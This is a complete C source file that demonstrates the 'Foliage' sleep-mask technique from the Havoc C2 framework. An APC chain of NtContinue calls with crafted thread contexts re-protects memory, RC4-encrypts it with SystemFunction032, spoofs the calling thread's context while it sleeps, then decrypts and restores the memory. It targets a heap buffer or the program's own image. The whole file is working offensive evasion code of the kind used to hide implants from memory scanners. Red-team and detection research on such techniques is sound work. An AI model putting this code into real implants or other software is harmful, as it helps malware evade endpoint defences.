/*
 * Standalone Foliage-style sleep mask demo.
 *
 * This version follows Havoc's Foliage flow more closely:
 *   NtCreateEvent
 *   NtCreateThreadEx suspended worker
 *   NtDuplicateObject current thread handle
 *   NtQueueApcThread(NtContinue, CONTEXT, FALSE, NULL)
 *   NtAlertResumeThread
 *   NtSignalAndWaitForSingleObject
 *
 * x64 only. Build with MSVC:
 *   cl /nologo /O2 /W4 /DWIN32_LEAN_AND_MEAN foliage_sleep_obf.c
 *
 * Usage:
 *   foliage_sleep_obf.exe [sleep_ms] [heap|self] [once|loop]
 *   foliage_sleep_obf.exe 1000 heap loop
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <intrin.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(_MSC_VER)
#pragma warning(disable: 4152) /* x64 CONTEXT.Rip stores API entry pointers intentionally. */
#endif

#ifndef _WIN64
int main(void)
{
    puts("foliage_sleep_obf.c is x64-only.");
    return 1;
}
#else

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((LONG)(Status)) >= 0)
#endif

#ifndef THREAD_CREATE_FLAGS_CREATE_SUSPENDED
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001u
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((LONG)0x00000000)
#endif

#define BOF_EVENT_SYNCHRONIZATION 1

typedef struct _USTRING_LOCAL {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING_LOCAL, *PUSTRING_LOCAL;

typedef LONG (NTAPI *PFN_NT_CREATE_EVENT)(
    PHANDLE EventHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    INT EventType,
    BOOLEAN InitialState);

typedef LONG (NTAPI *PFN_NT_CREATE_THREAD_EX)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList);

typedef LONG (NTAPI *PFN_NT_DUPLICATE_OBJECT)(
    HANDLE SourceProcessHandle,
    HANDLE SourceHandle,
    HANDLE TargetProcessHandle,
    PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Options);

typedef LONG (NTAPI *PFN_NT_QUEUE_APC_THREAD)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3);

typedef LONG (NTAPI *PFN_NT_ALERT_RESUME_THREAD)(
    HANDLE ThreadHandle,
    PULONG SuspendCount);

typedef LONG (NTAPI *PFN_NT_SIGNAL_AND_WAIT_FOR_SINGLE_OBJECT)(
    HANDLE SignalHandle,
    HANDLE WaitHandle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

typedef LONG (NTAPI *PFN_NT_WAIT_FOR_SINGLE_OBJECT)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

typedef LONG (NTAPI *PFN_NT_PROTECT_VIRTUAL_MEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

typedef LONG (NTAPI *PFN_NT_GET_CONTEXT_THREAD)(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext);

typedef LONG (NTAPI *PFN_NT_SET_CONTEXT_THREAD)(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext);

typedef LONG (NTAPI *PFN_NT_CLOSE)(HANDLE Handle);
typedef LONG (NTAPI *PFN_NT_TERMINATE_THREAD)(HANDLE ThreadHandle, LONG ExitStatus);
typedef LONG (NTAPI *PFN_NT_TEST_ALERT)(VOID);
typedef VOID (NTAPI *PFN_RTL_EXIT_USER_THREAD)(LONG ExitStatus);
typedef LONG (WINAPI *PFN_SYSTEM_FUNCTION_032)(PUSTRING_LOCAL Data, PUSTRING_LOCAL Key);

typedef struct _FOLIAGE_APIS {
    PFN_NT_CREATE_EVENT                  SysNtCreateEvent;
    PFN_NT_CREATE_THREAD_EX              SysNtCreateThreadEx;
    PFN_NT_DUPLICATE_OBJECT              SysNtDuplicateObject;
    PFN_NT_QUEUE_APC_THREAD              SysNtQueueApcThread;
    PFN_NT_ALERT_RESUME_THREAD           SysNtAlertResumeThread;
    PFN_NT_SIGNAL_AND_WAIT_FOR_SINGLE_OBJECT SysNtSignalAndWaitForSingleObject;
    PFN_NT_WAIT_FOR_SINGLE_OBJECT        NtWaitForSingleObject;
    PFN_NT_PROTECT_VIRTUAL_MEMORY        NtProtectVirtualMemory;
    PFN_NT_GET_CONTEXT_THREAD            NtGetContextThread;
    PFN_NT_SET_CONTEXT_THREAD            NtSetContextThread;
    PFN_NT_CLOSE                         SysNtClose;
    PFN_NT_TERMINATE_THREAD              SysNtTerminateThread;
    PFN_NT_TEST_ALERT                    NtTestAlert;
    PFN_NT_SET_CONTEXT_THREAD            NtSetContextThreadForSpoof;
    PFN_RTL_EXIT_USER_THREAD             RtlExitUserThread;
    PFN_SYSTEM_FUNCTION_032              SystemFunction032;
    PVOID                                NtContinue;
} FOLIAGE_APIS;

static FARPROC ResolveProc(HMODULE module, const char* name)
{
    return module ? GetProcAddress(module, name) : NULL;
}

static BOOL ResolveFoliageApis(FOLIAGE_APIS* api)
{
    HMODULE ntdll;
    HMODULE advapi;

    ZeroMemory(api, sizeof(*api));

    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        ntdll = LoadLibraryW(L"ntdll.dll");
    }

    advapi = GetModuleHandleW(L"advapi32.dll");
    if (!advapi) {
        advapi = LoadLibraryW(L"advapi32.dll");
    }

    api->SysNtCreateEvent = (PFN_NT_CREATE_EVENT)ResolveProc(ntdll, "NtCreateEvent");
    api->SysNtCreateThreadEx = (PFN_NT_CREATE_THREAD_EX)ResolveProc(ntdll, "NtCreateThreadEx");
    api->SysNtDuplicateObject = (PFN_NT_DUPLICATE_OBJECT)ResolveProc(ntdll, "NtDuplicateObject");
    api->SysNtQueueApcThread = (PFN_NT_QUEUE_APC_THREAD)ResolveProc(ntdll, "NtQueueApcThread");
    api->SysNtAlertResumeThread = (PFN_NT_ALERT_RESUME_THREAD)ResolveProc(ntdll, "NtAlertResumeThread");
    api->SysNtSignalAndWaitForSingleObject =
        (PFN_NT_SIGNAL_AND_WAIT_FOR_SINGLE_OBJECT)ResolveProc(ntdll, "NtSignalAndWaitForSingleObject");
    api->NtWaitForSingleObject = (PFN_NT_WAIT_FOR_SINGLE_OBJECT)ResolveProc(ntdll, "NtWaitForSingleObject");
    api->NtProtectVirtualMemory = (PFN_NT_PROTECT_VIRTUAL_MEMORY)ResolveProc(ntdll, "NtProtectVirtualMemory");
    api->NtGetContextThread = (PFN_NT_GET_CONTEXT_THREAD)ResolveProc(ntdll, "NtGetContextThread");
    api->NtSetContextThread = (PFN_NT_SET_CONTEXT_THREAD)ResolveProc(ntdll, "NtSetContextThread");
    api->SysNtClose = (PFN_NT_CLOSE)ResolveProc(ntdll, "NtClose");
    api->SysNtTerminateThread = (PFN_NT_TERMINATE_THREAD)ResolveProc(ntdll, "NtTerminateThread");
    api->NtTestAlert = (PFN_NT_TEST_ALERT)ResolveProc(ntdll, "NtTestAlert");
    api->RtlExitUserThread = (PFN_RTL_EXIT_USER_THREAD)ResolveProc(ntdll, "RtlExitUserThread");
    api->SystemFunction032 = (PFN_SYSTEM_FUNCTION_032)ResolveProc(advapi, "SystemFunction032");
    api->NtContinue = (PVOID)ResolveProc(ntdll, "NtContinue");
    api->NtSetContextThreadForSpoof = api->NtSetContextThread;

    return api->SysNtCreateEvent &&
           api->SysNtCreateThreadEx &&
           api->SysNtDuplicateObject &&
           api->SysNtQueueApcThread &&
           api->SysNtAlertResumeThread &&
           api->SysNtSignalAndWaitForSingleObject &&
           api->NtWaitForSingleObject &&
           api->NtProtectVirtualMemory &&
           api->NtGetContextThread &&
           api->NtSetContextThread &&
           api->SysNtClose &&
           api->SysNtTerminateThread &&
           api->NtTestAlert &&
           api->RtlExitUserThread &&
           api->SystemFunction032 &&
           api->NtContinue;
}

static VOID FillRandomKey(BYTE key[16])
{
    LARGE_INTEGER counter;
    DWORD seed;
    INT i;

    QueryPerformanceCounter(&counter);
    seed = GetTickCount() ^ GetCurrentProcessId() ^
           (DWORD)counter.LowPart ^ (DWORD)counter.HighPart;

    for (i = 0; i < 16; ++i) {
        seed = seed * 1664525u + 1013904223u;
        key[i] = (BYTE)(seed >> 24);
    }
}

static DWORD WINAPI FoliageThreadStart(LPVOID param)
{
    volatile LONG keep_running = 1;
    (void)param;

    while (keep_running) {
        SleepEx(INFINITE, TRUE);
    }

    return 0;
}

static PVOID AllocContext(void)
{
    PCONTEXT ctx = (PCONTEXT)LocalAlloc(LPTR, sizeof(CONTEXT));
    if (ctx) {
        ctx->ContextFlags = CONTEXT_FULL;
    }
    return ctx;
}

static VOID FreeContext(PCONTEXT* ctx)
{
    if (ctx && *ctx) {
        LocalFree(*ctx);
        *ctx = NULL;
    }
}

static VOID SetRet(PCONTEXT ctx, PVOID ret)
{
    *(PVOID*)(ctx->Rsp + sizeof(ULONG_PTR) * 0) = ret;
}

static VOID SetStackArg5(PCONTEXT ctx, PVOID value)
{
    *(PVOID*)(ctx->Rsp + sizeof(ULONG_PTR) * 5) = value;
}

static VOID BuildContextBase(PCONTEXT dst, const CONTEXT* src, SIZE_T stack_delta, PVOID rip, PVOID ret)
{
    memcpy(dst, src, sizeof(CONTEXT));
    dst->ContextFlags = CONTEXT_FULL;
    dst->Rip = (DWORD64)(ULONG_PTR)rip;
    dst->Rsp -= stack_delta;
    SetRet(dst, ret);
}

static BOOL QueueNtContinue(const FOLIAGE_APIS* api, HANDLE thread, PCONTEXT ctx)
{
    return NT_SUCCESS(api->SysNtQueueApcThread(thread, api->NtContinue, ctx, NULL, NULL));
}

static PVOID CurrentStackBase(void)
{
    return (PVOID)__readgsqword(0x08);
}

BOOL FoliageSleepMask(PVOID mask_base, SIZE_T mask_size,
                      PVOID restore_base, SIZE_T restore_size,
                      DWORD restore_protect, DWORD sleep_ms)
{
    FOLIAGE_APIS api;
    USTRING_LOCAL key;
    USTRING_LOCAL image;
    BYTE random[16];
    HANDLE h_event = NULL;
    HANDLE h_thread = NULL;
    HANDLE h_dup_thread = NULL;
    PCONTEXT rop_init = NULL;
    PCONTEXT rop_cap = NULL;
    PCONTEXT rop_spoof = NULL;
    PCONTEXT rop_begin = NULL;
    PCONTEXT rop_set_mem_rw = NULL;
    PCONTEXT rop_mem_enc = NULL;
    PCONTEXT rop_get_ctx = NULL;
    PCONTEXT rop_set_ctx = NULL;
    PCONTEXT rop_wait_obj = NULL;
    PCONTEXT rop_mem_dec = NULL;
    PCONTEXT rop_set_mem_rx = NULL;
    PCONTEXT rop_set_ctx2 = NULL;
    PCONTEXT rop_exit_thd = NULL;
    PVOID image_base_for_protect = mask_base;
    SIZE_T image_size_for_protect = mask_size;
    PVOID text_base_for_protect = restore_base;
    SIZE_T text_size_for_protect = restore_size;
    DWORD tmp_protect = 0;
    LARGE_INTEGER sleep_timeout;
    LONG status;
    BOOL ok = FALSE;

    if (!mask_base || !mask_size || !restore_base || !restore_size) {
        return FALSE;
    }

    if (!ResolveFoliageApis(&api)) {
        return FALSE;
    }

    ZeroMemory(&key, sizeof(key));
    ZeroMemory(&image, sizeof(image));
    FillRandomKey(random);

    key.Buffer = random;
    key.Length = key.MaximumLength = sizeof(random);
    image.Buffer = mask_base;
    image.Length = image.MaximumLength = (DWORD)mask_size;
    sleep_timeout.QuadPart = -((LONGLONG)sleep_ms * 10000LL);

    status = api.SysNtCreateEvent(&h_event, EVENT_ALL_ACCESS, NULL,
                                  BOF_EVENT_SYNCHRONIZATION, FALSE);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = api.SysNtCreateThreadEx(&h_thread, THREAD_ALL_ACCESS, NULL,
                                     GetCurrentProcess(),
                                     (PVOID)FoliageThreadStart, NULL,
                                     THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
                                     0, 0x1000 * 20, 0x1000 * 20, NULL);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    rop_init = (PCONTEXT)AllocContext();
    rop_cap = (PCONTEXT)AllocContext();
    rop_spoof = (PCONTEXT)AllocContext();
    rop_begin = (PCONTEXT)AllocContext();
    rop_set_mem_rw = (PCONTEXT)AllocContext();
    rop_mem_enc = (PCONTEXT)AllocContext();
    rop_get_ctx = (PCONTEXT)AllocContext();
    rop_set_ctx = (PCONTEXT)AllocContext();
    rop_wait_obj = (PCONTEXT)AllocContext();
    rop_mem_dec = (PCONTEXT)AllocContext();
    rop_set_mem_rx = (PCONTEXT)AllocContext();
    rop_set_ctx2 = (PCONTEXT)AllocContext();
    rop_exit_thd = (PCONTEXT)AllocContext();
    if (!rop_init || !rop_cap || !rop_spoof || !rop_begin || !rop_set_mem_rw ||
        !rop_mem_enc || !rop_get_ctx || !rop_set_ctx || !rop_wait_obj ||
        !rop_mem_dec || !rop_set_mem_rx || !rop_set_ctx2 || !rop_exit_thd) {
        goto cleanup;
    }

    status = api.SysNtDuplicateObject(GetCurrentProcess(), GetCurrentThread(),
                                      GetCurrentProcess(), &h_dup_thread,
                                      THREAD_ALL_ACCESS, 0, 0);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = api.NtGetContextThread(h_thread, rop_init);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    BuildContextBase(rop_begin, rop_init, 0x1000 * 13,
                     api.NtWaitForSingleObject, api.NtTestAlert);
    rop_begin->Rcx = (DWORD64)(ULONG_PTR)h_event;
    rop_begin->Rdx = FALSE;
    rop_begin->R8 = 0;

    BuildContextBase(rop_set_mem_rw, rop_init, 0x1000 * 12,
                     api.NtProtectVirtualMemory, api.NtTestAlert);
    rop_set_mem_rw->Rcx = (DWORD64)(ULONG_PTR)GetCurrentProcess();
    rop_set_mem_rw->Rdx = (DWORD64)(ULONG_PTR)&image_base_for_protect;
    rop_set_mem_rw->R8 = (DWORD64)(ULONG_PTR)&image_size_for_protect;
    rop_set_mem_rw->R9 = PAGE_READWRITE;
    SetStackArg5(rop_set_mem_rw, &tmp_protect);

    BuildContextBase(rop_mem_enc, rop_init, 0x1000 * 11,
                     api.SystemFunction032, api.NtTestAlert);
    rop_mem_enc->Rcx = (DWORD64)(ULONG_PTR)&image;
    rop_mem_enc->Rdx = (DWORD64)(ULONG_PTR)&key;

    BuildContextBase(rop_get_ctx, rop_init, 0x1000 * 10,
                     api.NtGetContextThread, api.NtTestAlert);
    rop_get_ctx->Rcx = (DWORD64)(ULONG_PTR)h_dup_thread;
    rop_get_ctx->Rdx = (DWORD64)(ULONG_PTR)rop_cap;

    BuildContextBase(rop_set_ctx, rop_init, 0x1000 * 9,
                     api.NtSetContextThreadForSpoof, api.NtTestAlert);
    rop_set_ctx->Rcx = (DWORD64)(ULONG_PTR)h_dup_thread;
    rop_set_ctx->Rdx = (DWORD64)(ULONG_PTR)rop_spoof;

    BuildContextBase(rop_wait_obj, rop_init, 0x1000 * 8,
                     api.NtWaitForSingleObject, api.NtTestAlert);
    rop_wait_obj->Rcx = (DWORD64)(ULONG_PTR)h_dup_thread;
    rop_wait_obj->Rdx = FALSE;
    rop_wait_obj->R8 = (DWORD64)(ULONG_PTR)&sleep_timeout;

    BuildContextBase(rop_mem_dec, rop_init, 0x1000 * 7,
                     api.SystemFunction032, api.NtTestAlert);
    rop_mem_dec->Rcx = (DWORD64)(ULONG_PTR)&image;
    rop_mem_dec->Rdx = (DWORD64)(ULONG_PTR)&key;

    BuildContextBase(rop_set_mem_rx, rop_init, 0x1000 * 6,
                     api.NtProtectVirtualMemory, api.NtTestAlert);
    rop_set_mem_rx->Rcx = (DWORD64)(ULONG_PTR)GetCurrentProcess();
    rop_set_mem_rx->Rdx = (DWORD64)(ULONG_PTR)&text_base_for_protect;
    rop_set_mem_rx->R8 = (DWORD64)(ULONG_PTR)&text_size_for_protect;
    rop_set_mem_rx->R9 = restore_protect;
    SetStackArg5(rop_set_mem_rx, &tmp_protect);

    BuildContextBase(rop_set_ctx2, rop_init, 0x1000 * 5,
                     api.NtSetContextThread, api.NtTestAlert);
    rop_set_ctx2->Rcx = (DWORD64)(ULONG_PTR)h_dup_thread;
    rop_set_ctx2->Rdx = (DWORD64)(ULONG_PTR)rop_cap;

    BuildContextBase(rop_exit_thd, rop_init, 0x1000 * 4,
                     api.RtlExitUserThread, api.NtTestAlert);
    rop_exit_thd->Rcx = STATUS_SUCCESS;

    if (!QueueNtContinue(&api, h_thread, rop_begin)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_set_mem_rw)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_mem_enc)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_get_ctx)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_set_ctx)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_wait_obj)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_mem_dec)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_set_mem_rx)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_set_ctx2)) goto cleanup;
    if (!QueueNtContinue(&api, h_thread, rop_exit_thd)) goto cleanup;

    status = api.SysNtAlertResumeThread(h_thread, NULL);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    rop_spoof->ContextFlags = CONTEXT_FULL;
    rop_spoof->Rip = (DWORD64)(ULONG_PTR)api.NtWaitForSingleObject;
    rop_spoof->Rsp = (DWORD64)(ULONG_PTR)CurrentStackBase();
    rop_spoof->Rcx = (DWORD64)(ULONG_PTR)h_dup_thread;
    rop_spoof->Rdx = FALSE;
    rop_spoof->R8 = 0;

    status = api.SysNtSignalAndWaitForSingleObject(h_event, h_thread, FALSE, NULL);
    ok = NT_SUCCESS(status);

cleanup:
    if (h_thread && WaitForSingleObject(h_thread, 0) != WAIT_OBJECT_0) {
        api.SysNtTerminateThread(h_thread, STATUS_SUCCESS);
    }
    if (h_dup_thread) {
        api.SysNtClose(h_dup_thread);
    }
    if (h_thread) {
        api.SysNtClose(h_thread);
    }
    if (h_event) {
        api.SysNtClose(h_event);
    }

    FreeContext(&rop_exit_thd);
    FreeContext(&rop_set_ctx2);
    FreeContext(&rop_set_mem_rx);
    FreeContext(&rop_mem_dec);
    FreeContext(&rop_wait_obj);
    FreeContext(&rop_set_ctx);
    FreeContext(&rop_get_ctx);
    FreeContext(&rop_mem_enc);
    FreeContext(&rop_set_mem_rw);
    FreeContext(&rop_begin);
    FreeContext(&rop_spoof);
    FreeContext(&rop_cap);
    FreeContext(&rop_init);

    SecureZeroMemory(random, sizeof(random));
    SecureZeroMemory(&key, sizeof(key));
    SecureZeroMemory(&image, sizeof(image));
    return ok;
}

static BOOL GetImageLayout(HMODULE module, PVOID* image_base, SIZE_T* image_size,
                           PVOID* text_base, SIZE_T* text_size)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD i;

    if (!module) {
        return FALSE;
    }

    dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    *image_base = module;
    *image_size = nt->OptionalHeader.SizeOfImage;
    *text_base = module;
    *text_size = nt->OptionalHeader.SizeOfImage;

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            *text_base = (BYTE*)module + sec[i].VirtualAddress;
            *text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }

    return TRUE;
}

static BOOL RunFoliageOnce(DWORD sleep_ms, BOOL self_mode)
{
    HMODULE self = GetModuleHandleW(NULL);
    PVOID image_base = NULL;
    PVOID text_base = NULL;
    SIZE_T image_size = 0;
    SIZE_T text_size = 0;
    PVOID heap = NULL;
    SIZE_T heap_size = 0x4000;
    BOOL ok;

    if (self_mode) {
        if (!GetImageLayout(self, &image_base, &image_size, &text_base, &text_size)) {
            puts("failed to parse image layout");
            return FALSE;
        }
    } else {
        heap = VirtualAlloc(NULL, heap_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        if (!heap) {
            return FALSE;
        }
        memset(heap, 0x41, heap_size);
        image_base = heap;
        image_size = heap_size;
        text_base = heap;
        text_size = heap_size;
    }

    printf("[*] technique=foliage-nt target=%s mask=%p size=0x%llx restore=%p restore_size=0x%llx sleep=%lu ms\n",
           self_mode ? "self" : "heap",
           image_base, (unsigned long long)image_size,
           text_base, (unsigned long long)text_size,
           sleep_ms);
    fflush(stdout);

    ok = FoliageSleepMask(image_base, image_size, text_base, text_size,
                          self_mode ? PAGE_EXECUTE_READ : PAGE_READWRITE,
                          sleep_ms);

    printf("[*] foliage-nt: %s\n", ok ? "ok" : "failed");

    if (heap) {
        VirtualFree(heap, 0, MEM_RELEASE);
    }

    return ok;
}

int main(int argc, char** argv)
{
    DWORD sleep_ms = 1000;
    BOOL self_mode = FALSE;
    BOOL loop = FALSE;
    DWORD round = 0;
    INT i;

    if (argc > 1) {
        sleep_ms = (DWORD)strtoul(argv[1], NULL, 10);
    }

    for (i = 2; i < argc; ++i) {
        if (!strcmp(argv[i], "self")) {
            self_mode = TRUE;
        } else if (!strcmp(argv[i], "heap")) {
            self_mode = FALSE;
        } else if (!strcmp(argv[i], "loop")) {
            loop = TRUE;
        } else if (!strcmp(argv[i], "once")) {
            loop = FALSE;
        }
    }

    if (!loop) {
        return RunFoliageOnce(sleep_ms, self_mode) ? 0 : 1;
    }

    puts("[*] loop mode enabled, press Ctrl+C to stop.");
    for (;;) {
        printf("[*] round %lu\n", ++round);
        fflush(stdout);
        RunFoliageOnce(sleep_ms, self_mode);
    }
}

#endif
